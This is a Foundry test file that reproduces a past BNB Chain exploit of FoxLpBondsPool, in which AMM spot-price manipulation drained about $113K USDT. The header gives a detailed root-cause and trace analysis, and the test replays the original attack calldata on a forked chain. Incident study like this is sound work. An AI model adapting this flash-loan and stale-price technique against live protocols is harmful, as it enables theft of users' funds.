// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// FOX / FoxLpBondsPool — AMM-spot-priced LP bond mint manipulation — BNB Chain
// ~$113K (112,976 USDT + dust) drained by an attacker-controlled contract in a single tx.
//
// Exploit tx  : 0x8e1775cbfd44db29744cc6687ff1822d2c47321de6e94062f789ad6181ad5514 (block 116169049)
// Caller EOA  : 0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9 (nonce 393, plain EOA, tx.origin)
// Attack ctrt : 0x3A82A2A77061017927e5331fFFd07c0308a1D2DA (entry, selector 0x7f14cf11)
// Helper ctrt : 0x9fa6d8a13b35e051bfc145918db0111dec13d1a0 (stake/bond orchestrator, passed as arg)
// Victim pair : 0xaAB18BCdEE287AeA288c0560612CAADF7c328803 (PancakeSwap USDT/FOX pair)
//   FOX token : 0xdF81d50c6657487D19B66A1b5375E35A804Abb93
//   USDT (BSC): 0x55d398326f99059fF775485246999027B3197955 (18 decimals)
// FoxLpBondsPool: 0x58e2a853bB14e46bEFD3148bd4280370feA4655a
// Treasury      : 0x87614d97808dCdecB069fe8489848Fa1c001e04D
//
// Root cause (reproducible contract mechanism, verified against the on-chain trace, NOT a
// key/signer/privileged-claim compromise):
//   FoxLpBondsPool.stake() reads a _stakeAmount from a manipulable PancakeSwap AMM spot quote of
//   the USDT/FOX pair BEFORE the flow executes its own large USDT->FOX swap against that same pair.
//   The swap materially skews the pair reserves. The subsequent addLiquidity() then supplies FOX
//   and USDT at the now-different reserve ratio, but _stakeAmount is never recomputed from the
//   assets actually deposited or the fair value of the minted LP. Treasury.lpBonds() trusts the
//   stale, economically-unsupported _stakeAmount, mints FOX against it, and in the same flow
//   transfers an inviterRewardAmount of freshly-minted FOX to an attacker-controlled referral
//   address. The attacker then sells that FOX back into the pair in the same tx for USDT.
//   Everything is funded by a large multi-pool USDT flash-loan aggregation; the flash liquidity
//   only sets the scale, it is not the vulnerability. The defect is manipulable spot pricing +
//   no accounting-to-actual-backing validation + immediate (non-delayed) reward settlement.
//
// Trace evidence (receipt logs, USDT/FOX are 18 decimals):
//   - log 62 : helper sends 240,987,392 USDT into the pair  (USDT->FOX swap, skews reserves)
//   - log 64 : helper receives    490,357 FOX from that swap
//   - log 67 : helper sends 240,987,392 USDT into the pair  (addLiquidity USDT leg)
//   - log 69 : helper sends      5,619 FOX into the pair     (addLiquidity FOX leg, post-skew ratio)
//   - log 71 : pair mints  1,162,001 LP to the helper
//   - log 75 : Treasury mints 91,319,059 FOX (bond mint driven by the stale _stakeAmount)
//   - log 78 : 2,659,778 FOX routed to referral address 0xae37bdc9 (inviter reward leg)
//   - log 81 : 2,593,283 FOX sold back into the pair
//   - log 82 : pair pays 482,652,334 USDT back to the attack contract
//   Net to the attack contract: +112,976.12 USDT plus dust (WBNB/USDC and two flash-loan LP
//   tokens), ~$113K, matching the reported ~$118.7K loss.
//
// Every protocol function invoked (stake, addLiquidity, lpBonds, the referral payout, the swaps)
// is a plain permissionless public call chain. The tx originates from a normal EOA calling the
// attack contract; there is no admin role, signer, or owner-storage path anywhere in the flow.
//
// Self-contained: one flash-loan-funded tx. The attack contract (15,009 bytes) and the helper
// (761 bytes) both already exist in fork state at block-1, so no same-block setup is needed.
//
// Faithful reproduction: fork at block-1 (real protocol state, before the exploit) and replay the
// EXACT original tx — prank the caller EOA as BOTH msg.sender AND tx.origin and low-level call the
// already-deployed attack contract with the EXACT original calldata (hardcoded verbatim below, no
// reconstruction). Assert the attack contract's net USDT gain.
//
// Run (the already-deployed attack contract uses cancun-era opcodes, so cancun is required; the
// repo default evm_version is shanghai, under which the replay reverts with EvmError: NotActivated):
//   forge test --contracts ./src/test/2026-08/FoxLpBondsPool_exp.sol --evm-version cancun -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract FoxLpBondsPool_exp is Test {
    address internal constant CALLER = 0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9;
    address internal constant ATTACK = 0x3A82A2A77061017927e5331fFFd07c0308a1D2DA;

    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant FOX = IERC20(0xdF81d50c6657487D19B66A1b5375E35A804Abb93);

    uint256 internal constant EXPLOIT_BLOCK = 116169049;

    // Exact original calldata: run(address) selector 0x7f14cf11 with the helper 0x9fa6d8a1... as arg.
    bytes internal constant EXPLOIT_CALLDATA =
        hex"7f14cf110000000000000000000000009fa6d8a13b35e051bfc145918db0111dec13d1a0";

    function setUp() public {
        // BSC archive fork at block-1 (bsc-dataseed public nodes are non-archive at this height;
        // hardcode an archive endpoint so the PoC is self-contained).
        vm.createSelectFork("https://api.zan.top/bsc-mainnet", EXPLOIT_BLOCK - 1);
    }

    function testExploit() public {
        uint256 usdtBefore = USDT.balanceOf(ATTACK);

        // Replay the exact tx: caller EOA is both msg.sender and tx.origin.
        vm.prank(CALLER, CALLER);
        (bool ok,) = ATTACK.call(EXPLOIT_CALLDATA);
        require(ok, "exploit call reverted");

        uint256 usdtAfter = USDT.balanceOf(ATTACK);
        uint256 gain = usdtAfter - usdtBefore;

        emit log_named_decimal_uint("attacker USDT gain", gain, 18);
        emit log_named_decimal_uint("attacker FOX balance", FOX.balanceOf(ATTACK), 18);

        // Net USDT profit into the attack contract, from the on-chain trace: 112,976.12 USDT.
        assertApproxEqAbs(gain, 112_976 ether, 5 ether, "USDT gain diverged from traced ~112,976");
    }
}
